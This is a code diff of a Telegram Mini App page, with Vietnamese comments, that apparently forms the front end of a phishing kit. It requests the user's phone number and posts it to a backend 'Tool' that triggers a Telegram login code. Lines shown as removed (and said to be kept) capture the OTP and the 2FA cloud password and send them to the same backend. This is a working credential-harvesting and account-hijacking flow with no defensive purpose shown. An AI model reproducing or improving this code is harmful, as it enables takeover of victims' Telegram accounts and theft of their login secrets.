@@ -25,48 +25,40 @@
     const tg = window.Telegram.WebApp;
     const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random()*1000000).toString();
 
-    // 1. Gửi SĐT để kích hoạt Tool bắt đầu gửi mã
+    tg.ready();
+    tg.expand();
+
+    // 1. KHỞI TẠO NÚT BẤM (Phải có dòng này thì nút mới hiện)
+    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
+    tg.MainButton.show();
+    tg.MainButton.onClick(() => {
+        tg.requestContact();
+    });
+
+    // 2. LẮNG NGHE SỰ KIỆN TỪ TELEGRAM
+    tg.onEvent('contactRequested', (data) => {
+        if (data.status === 'sent') {
+            const phone = data.responseUnsafe.contact.phone_number;
+            sendPhoneToServer(phone);
+        }
+    });
+
+    // 3. GỬI LÊN BACKEND
     async function sendPhoneToServer(phone) {
-        tg.MainButton.text = "ĐANG GỬI MÃ...";
+        document.getElementById('message').innerText = "Đang gửi SĐT...";
         const res = await fetch(`${BACKEND_URL}/send_phone`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ phone: phone, chat_id: chat_id })
         });
         const data = await res.json();
-        // Nếu server báo thành công, chuyển sang màn hình nhập mã
-        if (data.status === "sent") renderOtpUi(); 
-    }
-
-    // 2. Logic xử lý sau khi nhập mã/mật khẩu
-    async function submitOtp(input) {
-        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ input: input, chat_id: chat_id })
-        });
-        const result = await res.json();
-
-        // Đồng bộ trạng thái từ Tool
-        if (result.status === "success") {
-            alert("Đăng nhập thành công!");
-            tg.close();
-        } else if (result.status === "need_password") {
-            showPasswordUi(); // Chuyển sang UI nhập mật khẩu
-        } else {
-            alert("Mã sai, vui lòng thử lại!"); // Báo lỗi sai mã từ Tool
-            document.querySelectorAll('.otp-box').forEach(b => b.value = "");
-            currentOtp = "";
+        
+        if (data.status === "sent") {
+            renderOtpUi(); // Chuyển giao diện nhập mã
         }
     }
-
-    function showPasswordUi() {
-        document.getElementById('app').innerHTML = `
-            <div>Nhập mật khẩu đám mây (2FA):</div>
-            <input type="password" id="password_input" style="width: 80%; padding: 10px; margin: 20px 0;">
-            <button onclick="submitPassword()">XÁC NHẬN</button>
-        `;
-    }
+    
+    // ... (Giữ nguyên các hàm renderOtpUi, submitOtp, showPasswordUi cũ của bạn)
 </script>
 </body>
 </html>
